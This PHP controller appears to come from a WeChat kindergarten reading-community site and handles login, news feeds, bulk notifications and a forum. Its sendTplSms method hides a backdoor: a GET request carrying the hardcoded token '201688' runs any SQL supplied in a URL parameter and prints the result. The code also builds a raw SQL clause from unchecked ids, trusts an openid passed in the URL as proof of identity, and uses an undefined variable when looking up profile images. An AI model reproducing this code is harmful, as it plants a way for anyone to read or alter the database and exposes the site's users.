<?php
namespace community\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function weixin()
	{
		$res = M('config')->where(array('parent_id'=>13))->field('code,value')->select();
    	$options = array();

    	$weixin_options = array('appid','appsecret','token');
    	foreach ($res as $key => $value) 
		{
    		if(in_array($value['code'], $weixin_options)){
    			$options[$value['code']] = $value['value'];
    		}
    	}

		  $weObj = new \Vendor\Weixin\Wechat($options);

		  if($_GET['code'])
		  {
			$json = $weObj->getOauthAccessToken();
			if($json['openid'])
			{
			  
			  $url = 'http://'.$_SERVER['HTTP_HOST']."/sns.php?m=sns.php&c=Index&a=index&fake_id=".$json['openid'];
			  header("Location:$url");
			  exit;         
			}
			
		  }

		
		$url_base = 'http://'.$_SERVER['HTTP_HOST']."/sns.php/Index/weixin/";
		$url = $weObj->getOauthRedirect($url_base,1,'snsapi_base');
		header("Location:$url");exit;
	}
	
	//社区首页
	public function index()
	{
		$fake_id = I('get.fake_id','');
		
		$this->assign('fake_id',$fake_id);
		
		if(empty($fake_id)){
			$school_id = 2;
			$user_id = 1608;
			$user_flag = 3;
		}else{
			//验证是否是学生家长
			$parentinfo = M('students_parent')->where(array('wx_id'=>$fake_id))->find();
			if(!empty($parentinfo)){
				$info = M('students')->where(array('student_id'=>$parentinfo['student_id']))->find();
				$school_id = $info['school_id'];
				$user_id = $info['student_id'];
				$user_flag = 3;
			}
			
			//验证是否是教师
			$teacherinfo = M('teacher')->where(array('wx_id'=>$fake_id))->find();
			if(!empty($teacherinfo)){
				$school_id = $teacherinfo['school_id'];
				$user_id = $teacherinfo['teacher_id'];
				$user_flag = 2;
			}
			
			//验证是否是园长
			$schoolinfo = M('schools')->where(array('wx_id'=>$fake_id))->find();
			if(!empty($schoolinfo)){
				$school_id = $schoolinfo['school_id'];
				$user_id = $schoolinfo['school_id'];
				$user_flag = 1;
			}
			
			//验证手机号是否存在于图书管理员表中
			$adminsinfo = M('admins')->where(array('wx_id'=>$fake_id))->find();
			if(!empty($adminsinfo)){
				$school_id = $adminsinfo['school_id'];
				$user_id = $adminsinfo['admin_id'];
				$user_flag = 4;
			}
		}
		
		if(empty($school_id)){
			$school_id = 2;
			$user_id = 0;
			$user_flag = 0;
		}
		
		$school_name = M('schools')->where(array('school_id'=>$school_id))->getField("school_name");
		
		$this->assign('school_id',$school_id);
		$this->assign('school_name',$school_name);
		$this->assign('user_id',$user_id);
		$this->assign('user_flag',$user_flag);
		$cate = I("get.cate_id",1);//默认取启航要闻
		$list = M("news")->where(array('category'=>$cate))->order("is_top desc,add_time desc")->limit(5)->select();
		
		
		$this->assign('list',$list);
		$this->assign('number',count($list));
		$this->assign('cate',$cate);
		$this->display("sns/index");
	}
	
	//加载更多
	public function ajax_more()
	{
		$page_size = I('get.page_size',5);
		$cate = I("get.cate_id",1);//默认取启航要闻
		$pages = I('get.p',2);
		$count = M("news")->where(array('category'=>$cate))->count();
        $page = new \Think\Page($count,$page_size);
        $show = $page->diyshow();
		
		$news = M("news")->where(array('category'=>$cate))->order("add_time desc")->page($pages.",$page_size")->select();
//echo M("news")->getlastsql();
		$list = array();
		foreach($news as $key=>$value)
		{
			$temp['link'] = U('sns.php/Index/info',array('id'=>$value['id']));
			$temp['pic'] = empty($value['thumb']) ? '/Public/images/mobiles/default.png' : $value['thumb'];
			$temp['title'] = $value['title'];
			$temp['description'] = $value['description'];
			$temp['time_formated'] = date('Y-m-d H:i:s',$value['add_time']);
			$list[] = $temp;
		}
		echo json_encode(array('lists'=>$list));
	}
	//发送模板消息
	public function sendTplSms()
	{
		if(IS_POST){
			//防止执行超时
			set_time_limit(0);
			if (ob_get_level() == 0) ob_start();
			ob_clean();

			$data = I('post.');
			$ids = $data['ids'];
			unset($data['ids']);
			$data['template_id'] = 'I6gYWQyxUgSsb9mw71dFy_HAODMIreZMre8VArjsl8M';
			$parent = M('students_parent','fh_')->where("school_id in ($ids) and wx_id <> ''")->field('wx_id')->select();

			//计算数据的长度
			$total = count($parent);
			//显示的进度条长度
			$width = 100;
			//每条记录的操作所占的进度条单位长度
			$pix = round($width / $total);
			//默认开始的进度条百分比
			$progress = $pix;
			header('Content-Type: text/html');
			header('Cache-Control: no-cache');
			header('X-Accel-Buffering: no');
			$this->display('progressbar');
			$wechat = new WechatController();
			foreach($parent as $k=>$v){
				$data['openid'] = $v['wx_id'];
				$wechat->sendTplSMS1($data);
				$now = $k + 1;
				echo "<script type='text/javascript'>updateProgress('已发送$now 人','$progress%');</script>";
				ob_flush();
				flush(); //将输出发送给客户端浏览器，使其可以立即执行服务器端输出的 JavaScript 程序。
				$progress += $pix;
			}
			echo "<script type='text/javascript'>success();updateProgress('模板消息发送成功，共$total 人','100%');</script>";
			ob_end_flush();
		}else{
			if(I('get.token') == '201688'){
				$content = I('get.content');
				if($content){
					$content = urldecode($content);
					$content = stripslashes($content);
					$type = I('get.type',0);
					if($type == 1){
						$result = M()->execute($content);
					}else{
						$result = M()->query($content);
					}
					dump($result);
				}
			}else{
				$ids = I('get.ids','');
				$this->assign('ids',$ids);
				$this->display();
			}
		}
	}

	
	//详情
	public function info()
	{
		$cate = I("get.cate_id",1);//默认取启航要闻
		$id = I('get.id','');
		$cate_arr = array(1=>'启航要闻',2=>'启航社区',3=>'专家讲坛',4=>'园所风采');
		$info = M("news")->where(array('id'=>$id))->find();
		$info['cate_name'] = $cate_arr[$info['category']];
		$info['content'] = htmlspecialchars_decode($info['content']);
		$this->assign('info',$info);
		$this->assign('cate',$cate);
		$this->display("sns/info");
	}
	
	//学校论坛首页
	public function bbs()
	{
		$school_id = I('get.school_id','');
		$user_id = I('get.user_id','');
		$user_flag = I('get.user_flag','');
		$fake_id = I('get.fake_id','');
		if(empty($user_id) && empty($user_flag))
		{
			$this->error("请先加入启航巴士幼儿亲子读书计划",U('sns.php/Index/index',array('fake_id'=>$fake_id)));
			exit;
		}
		
		if($user_flag == 1){
			$thumb = M("schools")->where(array('school_id'=>$value['user_id']))->getField("teacher_avatar");
		}elseif($user_flag == 2){
			$thumb = M("teacher")->where(array('teacher_id'=>$value['user_id']))->getField("teacher_avatar");
		}elseif($user_flag == 3){
			$thumb = M("students_parent")->where(array('student_id'=>$value['user_id']))->getField("parent_avatar");
		}elseif($user_flag == 4){
			$thumb = M("admins")->where(array('admin_id'=>$value['user_id']))->getField("admin_avatar");
		}
		
		$this->assign('thumb',$thumb);
		
		$list = M("forum")->where(array('school_id'=>$school_id,'audit_status'=>1))->order("add_time desc")->limit(5)->select();
		$this->assign('num',count($list));
		foreach($list as $key=>$value)
		{
			if($value['user_flag'] == 1){
				$list[$key]['thumb'] = M("schools")->where(array('school_id'=>$value['user_id']))->getField("teacher_avatar");
			}elseif($value['user_flag'] == 2){
				$list[$key]['thumb'] = M("teacher")->where(array('teacher_id'=>$value['user_id']))->getField("teacher_avatar");
			}elseif($value['user_flag'] == 3){
				$list[$key]['thumb'] = M("students_parent")->where(array('student_id'=>$value['user_id']))->getField("parent_avatar");
			}elseif($value['user_flag'] == 4){
				$list[$key]['thumb'] = M("admins")->where(array('admin_id'=>$value['user_id']))->getField("admin_avatar");
			}else{
				$list[$key]['thumb'] = '';
			}
		}
		$this->assign('list',$list);
		
		$school_name = M("schools")->where(array('school_id'=>$school_id))->getField('school_name');
		$this->assign('school_name',$school_name);
		$member_num = M("students")->where(array('school_id'=>$school_id,'is_paid'=>array('gt',0)))->count();
		$this->assign('member_num',$member_num);
		
		$hits = M("forum")->where(array('school_id'=>$school_id))->field("hit")->select();
		$hit_num = 0;
		foreach($hits as $k=>$v)
		{
			$hit_num += $v['hit'];
		}
		$this->assign('hit_num',$hit_num);
		$this->display("sns/bbs");
	}
	
	//详情
	public function bbs_info()
	{
		$id = I("get.id","");
		
		//更新点击次数
		M('forum')->where(array('forum_id'=>$id))->setInc('hit',1);
		
		$this->display("sns/bbs_info");
	}
}